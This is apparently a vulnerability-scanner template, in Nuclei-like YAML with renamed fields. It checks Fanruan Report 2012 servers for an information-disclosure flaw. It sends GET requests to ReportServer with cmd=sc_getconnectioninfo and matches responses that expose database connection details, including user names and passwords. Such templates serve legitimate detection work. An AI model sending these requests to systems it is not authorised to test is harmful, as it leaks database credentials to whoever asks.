id: fanruanoa2012-disclosure
brief:
    title: Fanruan Report 2012 Information Disclosure
    by: YanYun
    level: high
    about: Fanruan Report 2012 has an information disclosure vulnerability, and some sensitive information can be obtained by accessing a specific URL
    label:
        - oa
        - java
        - fanruan
        - disclosure
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/ReportServer?op=fr_server&cmd=sc_getconnectioninfo'
        - '{{BaseURL}}/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo'
      signs:
        - "on": status
          status:
            - 200
        - "on": word
          has:
            - '"connection"'
            - '"name"'
            - '"driver"'
            - '"password"'
            - '"url"'
            - '"user"'
          in: body
          need: all
        - "on": word
          has:
            - application/json
          in: header
          need: all
